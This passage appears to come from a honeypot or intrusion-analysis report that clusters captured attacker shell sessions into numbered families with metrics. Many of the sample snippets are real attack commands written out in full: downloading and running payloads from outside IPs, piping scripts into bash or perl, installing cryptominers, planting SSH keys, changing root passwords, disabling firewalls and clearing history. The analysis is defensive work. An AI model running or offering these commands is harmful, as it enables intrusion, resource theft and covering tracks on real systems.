|:-----------------|:-------------|---------:|----------------:|
| 0979b8ccb94d955a | fed6d2464bd9 |        7 |               1 |
| bad4df823817d428 | e5e968b322b9 |        6 |               1 |

---

## Family 26

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.786 (±0.000)
- **Medoid Archetype**: `825ff8a4503eb3d5` (Session: `ad2288c7e8a3`, n_rows=1)

**Medoid Execution Snippet:**
```text
cd /tmp && wget http://45.95.55.214/webssh/wget.sh && chmod 777 wget.sh && sh wget.sh && rm -rf * && history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('wget', '&&'), ('chmod', '&&'), ('rm', '&&'), ('history', 'EOS')]`

Top operators: [('cd', 2), ('wget', 2), ('chmod', 2), ('rm', 2), ('history', 2), ('sh', 1), ('curl', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 825ff8a4503eb3d5 | ad2288c7e8a3 |        1 |               1 |
| 86beba4f94dd4124 | 35526dd4412f |        1 |               1 |

---

## Family 16

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.786 (±0.000)
- **Medoid Archetype**: `9df025ee75877712` (Session: `d680009e42cf`, n_rows=3)

**Medoid Execution Snippet:**
```text
uname -a
lspci | grep -i --color 'vga\ | 3d\ | 2d';export HOME=/dev/shm ;curl -s -L http://222.100.89.36/stx.sh | LC_ALL=en_US.UTF-8 bash -s 47GZnxsEvU1gRaShZCzDxo7TY7LV2688REobA3gFkk3RewKtpYGi9jK1qmFdUkaPD5N2rH5C7drRNe67z4RzVciMBgxhcu2
export HOME=/root ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('export', ';'), ('curl', '|'), ('bash', ';'), ('export', 'EOS')]`

Top operators: [('export', 4), ('uname', 2), ('curl', 2), ('bash', 2), ('lspci', 1), ('grep', 1), ('cd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9df025ee75877712 | d680009e42cf |        3 |               1 |
| ee4b0abf2a043367 | 68e72f9d0505 |        4 |               1 |

---

## Family 30

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.778 (±0.000)
- **Medoid Archetype**: `37b34f5e61ae1b77` (Session: `1c63d27b805c`, n_rows=9)

**Medoid Execution Snippet:**
```text
pkill YDEdr
pkill ip
pkill xmrig
pkill cnrig
pkill kswapd0
pkill x86_64
pkill x86
cat /etc/issue
echo hitherelolz ;
```

**Consensus Skeleton (op, conn pairs):**
`[('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('echo', 'EOS')]`

Top operators: [('kill', 11), ('echo', 2), ('cat', 1), ('curl', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 37b34f5e61ae1b77 | 1c63d27b805c |        9 |               1 |
| 53f4adc4e6755e96 | 525f9cdc72ca |        9 |               1 |

---

## Family 12

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.762 (±0.000)
- **Medoid Archetype**: `5e547a773774109a` (Session: `731147f036a7`, n_rows=16)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://194.26.229.35/bins/bin.x86
curl -O http://194.26.229.35/bins/bin.x86
cat bin.x86 >bins
chmod +x *;./bins Roots;./bin.x86 Roots
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://194.26.229.35/bins/bin1.x86
curl -O http: ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('cat', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('PH_EXEC_2', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('cat', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('PH_EXEC_3', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';')]`

Top operators: [('cd', 30), ('chmod', 8), ('wget', 6), ('curl', 6), ('sh', 5), ('cat', 4), ('PH_EXEC_1', 4), ('rm', 3), ('PH_EXEC_2', 2), ('PH_EXEC_3', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5e547a773774109a | 731147f036a7 |       16 |               1 |
| b140ad948829fcc2 | de6e2845e684 |       26 |               1 |

---

## Family 352

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1bbc259329362392` (Session: `111e3c07f3c4`, n_rows=7)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('passwd', '|'), ('bash', ';'), ('Enter', 'EOS')]`

Top operators: [('cd', 3), ('echo', 2), ('chattr', 1), ('lockr', 1), ('rm', 1), ('mkdir', 1), ('chmod', 1), ('cat', 1), ('grep', 1), ('wc', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 1bbc259329362392 | 111e3c07f3c4 |        7 |               2 |

---

## Family 175

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `225cf2bca2d346d6` (Session: `2cc7abfea2c1`, n_rows=10)

**Medoid Execution Snippet:**
```text
sh
shell
help
busybox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://200.9.155.138/.kabuso.s--h
busybox wget http://200.9.155.138/.kabuso.s--h
chmod +x .kabuso.s--h
sh .kabuso.s--h
rm -rf * ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('help', ';'), ('busybox', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('busybox', ';'), ('chmod', ';'), ('sh', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 5), ('sh', 2), ('busybox', 2), ('shell', 1), ('help', 1), ('wget', 1), ('chmod', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 225cf2bca2d346d6 | 2cc7abfea2c1 |       10 |               2 |

---

## Family 187

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `2697a6bb98f0574c` (Session: `01cd550fa716`, n_rows=4)

**Medoid Execution Snippet:**
```text
sh
cd /tmp
rm -rf *
wget http://209.141.37.15/bins/bin.mips ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('cd', ';'), ('rm', ';'), ('wget', 'EOS')]`

Top operators: [('sh', 1), ('cd', 1), ('rm', 1), ('wget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2697a6bb98f0574c | 01cd550fa716 |        4 |               2 |

---

## Family 257

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `522052637efe1eb5` (Session: `19e7d15009de`, n_rows=21)

**Medoid Execution Snippet:**
```text
sh
shell
ls /
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://80.94.92.38/update.sh -O update.sh
busybox wget http://80.94.92.38/update.sh -O update.sh
chmod 777 update.sh
sh update.sh
rm -rf update.sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
tftp -r update.sh -g 80.94 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('ls', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('busybox', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('tftp', ';'), ('busybox', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('ftpget', ';'), ('busybox', ';'), ('chmod', ';'), ('sh', ';'), ('rm', 'EOS')]`

Top operators: [('cd', 15), ('sh', 4), ('busybox', 3), ('chmod', 3), ('rm', 3), ('shell', 1), ('ls', 1), ('wget', 1), ('tftp', 1), ('ftpget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 522052637efe1eb5 | 19e7d15009de |       21 |               2 |

---

## Family 268

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `5cd19a16d909f766` (Session: `09ca0df7282c`, n_rows=10)

**Medoid Execution Snippet:**
```text
#!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://23.235.171.196:1211/112
curl -O http://23.235.171.196:1211/112
chmod +x 112
./112
rm -rf 123.sh
history -c
/bin/eyshcjdmzg
ls -la /var/run/gcc.pid ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('history', ';'), ('PH_EXEC_2', ';'), ('ls', 'EOS')]`

Top operators: [('wget', 1), ('curl', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('rm', 1), ('history', 1), ('PH_EXEC_2', 1), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5cd19a16d909f766 | 09ca0df7282c |       10 |               2 |

---

## Family 312

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `5fa33addff7d6346` (Session: `7d2b1b11826d`, n_rows=17)

**Medoid Execution Snippet:**
```text
pkill xmrig
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
apt install dos2unix -y
yum install dos2unix -y
curl -O http://141.98.10.246/sto ...
```

**Consensus Skeleton (op, conn pairs):**
`[('kill', ';'), ('curl', '|'), ('bash', ';'), ('apt', ';'), ('yum', ';'), ('curl', ';'), ('chmod', ';'), ('dos2unix', ';'), ('PH_EXEC_1', ';'), ('rm', ';'), ('history', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', 'EOS')]`

Top operators: [('kill', 8), ('curl', 2), ('bash', 1), ('apt', 1), ('yum', 1), ('chmod', 1), ('dos2unix', 1), ('PH_EXEC_1', 1), ('rm', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5fa33addff7d6346 | 7d2b1b11826d |       17 |               2 |

---

## Family 254

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6ce199d0416a824d` (Session: `9b7cd7ff9b8c`, n_rows=2)

**Medoid Execution Snippet:**
```text
User-Agent: curl/7.67.0
Accept: */* ;
```

**Consensus Skeleton (op, conn pairs):**
`[('User-Agent:', ';'), ('Accept:', 'EOS')]`

Top operators: [('User-Agent:', 1), ('Accept:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6ce199d0416a824d | 9b7cd7ff9b8c |        2 |               2 |

---

## Family 231

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `6e6455a7ab4979bf` (Session: `032a47bb6fd7`, n_rows=2)

**Medoid Execution Snippet:**
```text
curl -O http://45.90.161.105/systemd
wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 47Yz2np6PGzMw1u2WYpgW2Qv8WMfsy1dKLYsH9GMP9d5ZKZ6GqcGJ86YbKQ8t5MUFGHrA2j61QwNx9yD1oe2ek6DVptxdE7 -k --tls --rig-id ZTX1 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', ';'), ('wget', '&&'), ('chmod', '&&'), ('PH_EXEC_1', 'EOS')]`

Top operators: [('curl', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6e6455a7ab4979bf | 032a47bb6fd7 |        2 |               2 |

---

## Family 199

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7b27b012389ba772` (Session: `d768ef201246`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -a
nproc ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('nproc', 'EOS')]`

Top operators: [('uname', 1), ('nproc', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7b27b012389ba772 | d768ef201246 |        2 |               2 |

---

## Family 132

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `824d1e7d024df565` (Session: `26daaa0c9fc5`, n_rows=9)

**Medoid Execution Snippet:**
```text
cd /tmp
wget webserverforstudy.webredirect.org:8281/sshd -O /tmp/sshd
curl webserverforstudy.webredirect.org:8281/sshd -o /tmp/sshd
bash /tmp/sshd
rm -rf /tmp/sshd
rm -r /tmp/sshd
rm -rf /var/tmp/sshd
rm -rf /var/tmp/sshd.*
rm -rf /tmp/sshd.* ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('curl', ';'), ('bash', ';'), ('rm', ';'), ('rm', ';'), ('rm', ';'), ('rm', ';'), ('rm', 'EOS')]`

Top operators: [('rm', 5), ('cd', 1), ('wget', 1), ('curl', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 824d1e7d024df565 | 26daaa0c9fc5 |        9 |               2 |

---

## Family 277

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `8519639b3b8ce63a` (Session: `1d5e66471338`, n_rows=10)

**Medoid Execution Snippet:**
```text
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
history -n
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
history -r
uname -a
rm index.html
wget http://google.com
cat index.html ;
```

**Consensus Skeleton (op, conn pairs):**
`[('unset', ';'), ('history', ';'), ('export', ';'), ('export', ';'), ('export', ';'), ('history', ';'), ('uname', ';'), ('rm', ';'), ('wget', ';'), ('cat', 'EOS')]`

Top operators: [('export', 3), ('history', 2), ('unset', 1), ('uname', 1), ('rm', 1), ('wget', 1), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 8519639b3b8ce63a | 1d5e66471338 |       10 |               2 |

---

## Family 240

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `aca4e45d351775c8` (Session: `0fd489077905`, n_rows=6)

**Medoid Execution Snippet:**
```text
/etc/init.d/iptables stop
service iptables stop
SuSEfirewall2 stop
reSuSEfirewall2 stop
wget -c http://137.220.194.14:9090/xxarm
chmod 777 xxarm;./xxarm ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('systemctl', ';'), ('SuSEfirewall2', ';'), ('reSuSEfirewall2', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_2', 'EOS')]`

Top operators: [('PH_EXEC_1', 1), ('systemctl', 1), ('SuSEfirewall2', 1), ('reSuSEfirewall2', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_2', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| aca4e45d351775c8 | 0fd489077905 |        6 |               2 |

---

## Family 171

- **Total Session Volume**: 2
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `d5ce2919dd0e4081` (Session: `1a3791b5e472`, n_rows=1)

**Medoid Execution Snippet:**
```text
lscpu && echo -e "55Hv52BC\n55Hv52BC" | passwd ;
```

**Consensus Skeleton (op, conn pairs):**
`[('lscpu', '&&'), ('echo', '|'), ('passwd', 'EOS')]`

Top operators: [('lscpu', 1), ('echo', 1), ('passwd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d5ce2919dd0e4081 | 1a3791b5e472 |        1 |               2 |

---

## Family 347

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `01736ab0be00d020` (Session: `7a5879a222e8`, n_rows=8)

**Medoid Execution Snippet:**
```text
crontab -l
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc -l
top
uname
uname -a
lscpu | grep Model ;
```

**Consensus Skeleton (op, conn pairs):**
`[('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', 'EOS')]`

Top operators: [('uname', 3), ('grep', 3), ('crontab', 1), ('w', 1), ('cat', 1), ('wc', 1), ('top', 1), ('lscpu', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 01736ab0be00d020 | 7a5879a222e8 |        8 |               1 |

---

## Family 266

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `02c73d2e797c8e58` (Session: `d25037c6e29c`, n_rows=7)

**Medoid Execution Snippet:**
```text
pkill ip
pkill xmrig
pkill Opera
pkill x86
pkill docker
pkill java
curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA ;
```

**Consensus Skeleton (op, conn pairs):**
`[('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('kill', ';'), ('curl', '|'), ('bash', 'EOS')]`

Top operators: [('kill', 6), ('curl', 1), ('bash', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 02c73d2e797c8e58 | d25037c6e29c |        7 |               1 |

---

## Family 189

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `02eedb1cc8ba9577` (Session: `993f2f2089d4`, n_rows=3)

**Medoid Execution Snippet:**
```text
uname -a
lspci | grep -i --color 'vga\ | 3d\ | 2d';curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
echo root:d11es234e3123g4tij24jtiu3ji4rg  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('lspci', '|'), ('grep', ';'), ('curl', '|'), ('bash', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', 'EOS')]`

Top operators: [('bash', 2), ('uname', 1), ('lspci', 1), ('grep', 1), ('curl', 1), ('echo', 1), ('chpasswd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 02eedb1cc8ba9577 | 993f2f2089d4 |        3 |               1 |

---

## Family 353

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `04d4a0fe3328a8d2` (Session: `963909450f5e`, n_rows=1)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l | head -c 30 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', '|'), ('head', 'EOS')]`

Top operators: [('cat', 1), ('grep', 1), ('wc', 1), ('head', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 04d4a0fe3328a8d2 | 963909450f5e |        1 |               1 |

---

## Family 301

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `056646a27a9526eb` (Session: `e3fcf1695f54`, n_rows=1)

**Medoid Execution Snippet:**
```text
exit ;
```

**Consensus Skeleton (op, conn pairs):**
`[('exit', 'EOS')]`

Top operators: [('exit', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 056646a27a9526eb | e3fcf1695f54 |        1 |               1 |

---

## Family 188

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `05fb26ee7c0664d0` (Session: `3ea85975404a`, n_rows=10)

**Medoid Execution Snippet:**
```text
nload
help
cd /tmp  cd /var/run  cd /mnt  cd /root  cd /
wget http://149.57.139.220/assailant.x86
chmod +x assailant.x86
./assailant.x86
ls
sh assailant.x86
apt install nload
nload ;
```

**Consensus Skeleton (op, conn pairs):**
`[('nload', ';'), ('help', ';'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('ls', ';'), ('sh', ';'), ('apt', ';'), ('nload', 'EOS')]`

Top operators: [('nload', 2), ('help', 1), ('cd', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('ls', 1), ('sh', 1), ('apt', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 05fb26ee7c0664d0 | 3ea85975404a |       10 |               1 |

---

## Family 300

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `076b7bc9f78d3133` (Session: `7f14a64ce3f4`, n_rows=7)

**Medoid Execution Snippet:**
```text
cd /tmp
rm -rf x86_64
wget http://45.14.149.204/x86_64
chmod 777 *
./x86_64 x86hxed
pkill xmrig
pkill cnrig ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('kill', ';'), ('kill', 'EOS')]`

Top operators: [('kill', 2), ('cd', 1), ('rm', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 076b7bc9f78d3133 | 7f14a64ce3f4 |        7 |               1 |

---

## Family 264

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0a48f51c9ab23326` (Session: `70f9168eef89`, n_rows=4)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c
nvidia-smi -L
wget -qO - 85.239.33.32/sshd | perl
curl -s run.psybnc.org/sshd | perl ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('cut', '|'), ('uniq', ';'), ('nvidia-smi', ';'), ('wget', '|'), ('perl', ';'), ('curl', '|'), ('perl', 'EOS')]`

Top operators: [('perl', 2), ('cat', 1), ('grep', 1), ('cut', 1), ('uniq', 1), ('nvidia-smi', 1), ('wget', 1), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0a48f51c9ab23326 | 70f9168eef89 |        4 |               1 |

---

## Family 191

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0c90396db5a58b33` (Session: `e6d4a743dd9c`, n_rows=16)

**Medoid Execution Snippet:**
```text
wget -P /tmp/system "http://45.83.179.43/stubs/Arm_x86"
wget -P /tmp/system "http://45.83.179.43/stubs/Linux_amd64"
wget -P /tmp/system "http://45.83.179.43/stubs/Linux_x86"
wget -P /tmp/system "http://45.83.179.43/stubs/Mips"
chmod 777 /tmp/system/Arm_x86
chmod 777 /tmp/system/Linux_amd64
chmod 777 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('wget', ';'), ('wget', ';'), ('wget', ';'), ('chmod', ';'), ('chmod', ';'), ('chmod', ';'), ('chmod', ';'), ('nohup', ';'), ('ps', '|'), ('grep', ';'), ('nohup', ';'), ('ps', '|'), ('grep', ';'), ('nohup', ';'), ('ps', '|'), ('grep', ';'), ('nohup', ';'), ('ps', '|'), ('grep', 'EOS')]`

Top operators: [('wget', 4), ('chmod', 4), ('nohup', 4), ('ps', 4), ('grep', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0c90396db5a58b33 | e6d4a743dd9c |       16 |               1 |

---

## Family 282

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0ec09df9c267b5e2` (Session: `d72b690f85d6`, n_rows=8)

**Medoid Execution Snippet:**
```text
cd /tmp
wget 164.92.142.65/irc.pl
perl irc.pl
rm -rf irc.pl
curl -O 164.92.142.65/irc.pl
perl irc.pl
rm -rf irc.pl
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('perl', ';'), ('rm', ';'), ('curl', ';'), ('perl', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('perl', 2), ('rm', 2), ('cd', 1), ('wget', 1), ('curl', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0ec09df9c267b5e2 | d72b690f85d6 |        8 |               1 |

---

## Family 349

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `0f8355965770e683` (Session: `2e23a12d4927`, n_rows=2)

**Medoid Execution Snippet:**
```text
User-Agent: Mozilla/5.0
Accept-Encoding: gzip ;
```

**Consensus Skeleton (op, conn pairs):**
`[('User-Agent:', ';'), ('Accept-Encoding:', 'EOS')]`

Top operators: [('User-Agent:', 1), ('Accept-Encoding:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0f8355965770e683 | 2e23a12d4927 |        2 |               1 |

---

## Family 348

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `1171bc0d72c7feb8` (Session: `395e8848cb8e`, n_rows=1)

**Medoid Execution Snippet:**
```text
wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', '&&'), ('chmod', '&&'), ('PH_EXEC_1', 'EOS')]`

